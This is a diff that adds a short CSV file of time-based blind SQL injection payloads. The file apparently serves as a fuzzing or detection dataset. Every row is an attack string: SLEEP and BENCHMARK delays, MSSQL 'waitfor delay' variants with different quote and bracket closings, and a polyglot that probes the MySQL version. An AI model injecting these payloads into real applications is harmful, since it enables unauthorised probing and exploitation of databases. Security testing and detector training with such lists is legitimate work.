@@ -1,0 +1,17 @@
+Payload1,Payload2
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/ ,1
+"SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/ ",1
+"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),?SLEEP(1)))OR""*/",1
+1 waitfor delay '0:0:1'--,1
+1; waitfor delay '0:0:1'--,1
+1'; waitfor delay '0:0:1'--,1
+1); waitfor delay '0:0:1'--,1
+1)); waitfor delay '0:0:1'--,1
+1'); waitfor delay '0:0:1'--,1
+1')); waitfor delay '0:0:1'--,1
+"1 or benchmark(100000000,MD5(1))#",1
+"1' or benchmark(100000000,MD5(1))#",1
+"1) or benchmark(100000000,MD5(1))#",1
+"1') or benchmark(100000000,MD5(1))#",1
+"1)) or benchmark(100000000,MD5(1))#",1
+"1')) or benchmark(100000000,MD5(1))#",1
